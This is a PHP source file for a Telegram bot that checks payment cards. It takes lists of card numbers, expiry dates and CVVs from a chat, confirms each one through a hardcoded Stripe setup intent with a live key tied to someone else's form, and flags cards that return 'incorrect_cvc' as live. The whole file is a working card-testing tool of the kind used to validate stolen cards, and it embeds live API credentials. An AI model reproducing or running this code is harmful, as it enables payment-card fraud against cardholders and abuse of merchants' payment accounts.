<?php



if(file_exists(getcwd().'./cookie.txt')){
 	unlink('cookie.txt');
}

function getstr($url,$start,$fim,$n){
	return explode($fim, explode($start, $url)[$n])[0];
}

function letras($size){
    $basic = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $return= "";
    for($count= 0; $size > $count; $count++){
        $return.= $basic[rand(0, strlen($basic) - 1)];
    }
    return $return;
}



function ggtesta($msg){
	$chatid = $msg['chat']['id'];


	$msgen = json_decode($msgen , true)['result'];
	$msgid = $msgen['message_id'];

	$lista = $msg['text'];
	$lista = substr($lista, 3);
    $lista = explode("\n", $lista);

    if (sizeof($lista) > 5){
	    die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "sorry, but you crossed the gg limit (5)" , "reply_to_message_id" => $msg['message_id'])));

    }
    
    $msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "Arguade um pouco !"));

    $msgid = json_decode($msgen ,true )['result']['message_id'];
    $apr = 0;
    $rep = 0;
    $erros = 0;
    $lives = [];
    $status = 'parado';
    for ($i=0; $i < sizeof($lista) ; $i++) { 
    	$lista2 = str_replace(array(" ",'/','!',":"), "|", trim($lista[$i]));
		$cc = explode("|", $lista2)[0];
		$mes = explode("|", $lista2)[1];
		$ano = explode("|", $lista2)[2];
		$cvv = explode("|", $lista2)[3];

		$email = letras(15).'@gmail.com';
		$name = letras(6).' '.letras(6);
    	$request = request(
    		'https://api.stripe.com/v1/setup_intents/seti_0HW4XVnuL8NmlnsQS02iGhm3/confirm',
    		'payment_method_data[type]=card&payment_method_data[billing_details][name]=gjghjghj&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=5b3282d6-515c-4c0e-b337-5e9034e6ecaa3572ce&payment_method_data[muid]=47384581-62fa-454f-8b5e-ce095d2a7de4fab61f&payment_method_data[sid]=8d43f735-c39d-4371-919e-827320b60d1b304393&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fe5627e51%3B+stripe-js-v3%2Fe5627e51&payment_method_data[time_on_page]=32137&payment_method_data[referrer]=https%3A%2F%2Fwww.jotform.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_9SEidWzwPrgXRQ6VbGpuSXoY&client_secret=seti_0HW4XVnuL8NmlnsQS02iGhm3_secret_I6H53qROc632NdxQbBzQ67PRFJYoGxi',
    		array(),
    		false
    	);

    	$res = json_decode($request , true);
    	$rand = ".....";
    	$ponto = substr($rand, 0,rand(0,strlen($rand)));
    	if ($res['error']['code'] == "incorrect_cvc"){
    		$apr ++;
    		$reto = $res['error']['message'];
    		$status = "Aprovada";
    		$lives[] = "Aprovada » $lista2 » Retorno: $reto";
    	}else if ($res['error']['code']){
    		$rep ++;
    		$status = "Reprovada";
    	}else{
    		$erros ++;
    		$status = "error gatewary";
    	}


        bot("editMessageText",array("chat_id" => $chatid , "message_id" => $msgid, "text" => 
        	"<b>em fila: $lista2</b>\n<b>status</b>: $status $ponto
        	\n<b>Aprovadas:</b> $apr\n<b>Reprovadas:</b> $rep\n<b>Erros:</b> $erros" , "parse_mode" => "html"));
    }

    $lives = implode($lives, "\n");
    bot("editMessageText",array("chat_id" => $chatid , "message_id" => $msgid, "text" => 
        	"$lives\n\n<b>status</b>: Finalizado!
        	\n<b>Aprovadas:</b> $apr\n<b>Reprovadas:</b> $rep\n<b>Erros:</b> $erros" , "parse_mode" => "html"));



}